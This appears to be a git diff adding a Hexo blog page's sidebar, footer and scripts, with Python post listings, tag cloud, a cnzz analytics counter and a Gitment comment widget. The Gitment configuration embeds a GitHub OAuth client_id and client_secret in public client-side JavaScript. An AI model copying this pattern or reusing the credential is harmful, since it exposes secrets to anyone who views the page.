+        <span style="background-image:url(http://omfis13un.bkt.clouddn.com/logo-sitemasthead.gif)" alt="[福利]PyCon2017全部演讲视频汇总" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Python/">Python</a></p>
+                            <p class="item-title"><a href="/2017/05/25/Python-pyCon2017-keynotes.html" class="title">[福利]PyCon2017全部演讲视频汇总</a></p>
+                            <p class="item-date"><time datetime="2017-05-25T15:56:55.000Z" itemprop="datePublished">2017-05-25</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2017/05/12/Python-Print-function.html" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Python/">Python</a></p>
+                            <p class="item-title"><a href="/2017/05/12/Python-Print-function.html" class="title">Python-from __future__ import print_function</a></p>
+                            <p class="item-date"><time datetime="2017-05-12T06:55:03.000Z" itemprop="datePublished">2017-05-12</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2017/05/11/Product-pyCSDNDailySpider.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://omfis13un.bkt.clouddn.com/pyCSDNDailySpider.png)" alt="Product-一个小爬虫pyCSDNDailySpider" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Product/">Product</a></p>
+                            <p class="item-title"><a href="/2017/05/11/Product-pyCSDNDailySpider.html" class="title">Product-一个小爬虫pyCSDNDailySpider</a></p>
+                            <p class="item-date"><time datetime="2017-05-10T16:11:03.000Z" itemprop="datePublished">2017-05-11</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2017/05/04/Python-How-to-use-eval.html" class="thumbnail">
+    
+    
+        <span style="background-image:url(http://omfis13un.bkt.clouddn.com/python-eval.jpg)" alt="【转】Python中eval的强大与潜在风险" class="thumbnail-image"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/Python/">Python</a></p>
+                            <p class="item-title"><a href="/2017/05/04/Python-How-to-use-eval.html" class="title">【转】Python中eval的强大与潜在风险</a></p>
+                            <p class="item-date"><time datetime="2017-05-04T15:57:34.000Z" itemprop="datePublished">2017-05-04</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title" style="color:#CD0000">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Product/">Product</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a><span class="category-list-count">1</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title" style="color:#CD0000">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">五月 2017</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">四月 2017</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">三月 2017</a><span class="archive-list-count">6</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title" style="color:#CD0000">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Anaconda/" style="font-size: 10px;">Anaconda</a> <a href="/tags/Linux/" style="font-size: 16.67px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 10px;">MySQL</a> <a href="/tags/MySQLdb/" style="font-size: 10px;">MySQLdb</a> <a href="/tags/PyCon2017/" style="font-size: 10px;">PyCon2017</a> <a href="/tags/Python/" style="font-size: 20px;">Python</a> <a href="/tags/SyntaxError/" style="font-size: 13.33px;">SyntaxError</a> <a href="/tags/branch/" style="font-size: 10px;">branch</a> <a href="/tags/close/" style="font-size: 10px;">close</a> <a href="/tags/closure/" style="font-size: 10px;">closure</a> <a href="/tags/dict/" style="font-size: 10px;">dict</a> <a href="/tags/eval/" style="font-size: 10px;">eval</a> <a href="/tags/file/" style="font-size: 10px;">file</a> <a href="/tags/filter/" style="font-size: 10px;">filter</a> <a href="/tags/flow-control/" style="font-size: 10px;">flow control</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/map/" style="font-size: 10px;">map</a> <a href="/tags/open/" style="font-size: 10px;">open</a> <a href="/tags/operators/" style="font-size: 10px;">operators</a> <a href="/tags/reduce/" style="font-size: 10px;">reduce</a> <a href="/tags/rhel7-2/" style="font-size: 10px;">rhel7.2</a> <a href="/tags/rpm/" style="font-size: 10px;">rpm</a> <a href="/tags/source-code/" style="font-size: 13.33px;">source code</a> <a href="/tags/tuple/" style="font-size: 10px;">tuple</a> <a href="/tags/yum/" style="font-size: 10px;">yum</a> <a href="/tags/操作系统/" style="font-size: 10px;">操作系统</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title" style="color:#CD0000">友情链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://soledadmg.com">soledadmg</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://linhut.cn">林小屋博客</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.python.org">python官网</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://hexo.io">Hexo</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2017 Vimiix&nbsp
+            页面基于 <a href="http://hexo.io/" target="_blank">Hexo</a>搭建. 采用<a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>主题。
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1261445492'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s4.cnzz.com/z_stat.php%3Fid%3D1261445492%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+
+
+
+        </div>
+    </div>
+</footer>
+        
+    
+	<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+	<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+	<script>
+		var gitment = new Gitment({
+			owner: 'vimiix',
+			repo: 'vimiix.github.io',
+			oauth: {
+				client_id: 'abd8e4f14a1823b2146f',
+				client_secret: '4ffc7b300f732364340dd9fd141938147d8a73e5',
+			},
+		})
+		gitment.render('commentContainer')
+	</script>
+	
+
+
+    
+        <script src="/vendor/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-share.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-video.min.js"></script>
+    
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
